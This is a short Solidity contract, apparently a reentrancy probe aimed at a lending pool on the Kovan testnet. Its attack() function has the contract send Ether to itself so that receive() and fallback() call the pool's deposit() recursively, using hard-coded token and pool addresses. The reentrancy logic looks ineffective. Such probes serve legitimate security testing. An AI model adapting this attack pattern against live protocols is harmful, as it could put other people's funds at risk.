pragma solidity 0.6.12;
pragma experimental ABIEncoderV2;

// https://kovan.etherscan.io/address/0xc8b569a4d6a6b86e2db0b3cc3479a37f259344a9
interface IERC20 {
    function approve(address spender, uint256 amount) external;
}

interface LendingPool {
    function deposit(
        address asset,
        uint256 amount,
        address onBehalfOf,
        uint16 referralCode
    ) external;
}

contract ReeterancyCallForLendingPool {
    // Fallback is called when DepositFunds sends Ether to this contract.
    fallback() external payable {
        depositeInternal(true);
        depositeInternal(true);
    }

    receive() external payable {
        depositeInternal(true);
        depositeInternal(true);
    }

    function attack() external payable {
        IERC20(0xe22da380ee6B445bb8273C81944ADEB6E8450422).approve(
            0x3526a2fe5dA32d0f0814086848628bF12A1E4417,
            10000000
        );

        (bool isSent, ) = payable(address(this)).call{value: msg.value}('');
        require(isSent, 'Failed to send Ether');
    }

    function depositeInternal(bool beRecursive) internal {
        LendingPool(0x3526a2fe5dA32d0f0814086848628bF12A1E4417).deposit(
            0xe22da380ee6B445bb8273C81944ADEB6E8450422,
            1,
            0x7C71a3D85a8d620EeaB9339cCE776Ddc14a8129C,
            0
        );
        if (beRecursive) {
            depositeInternal(false);
        }
    }
}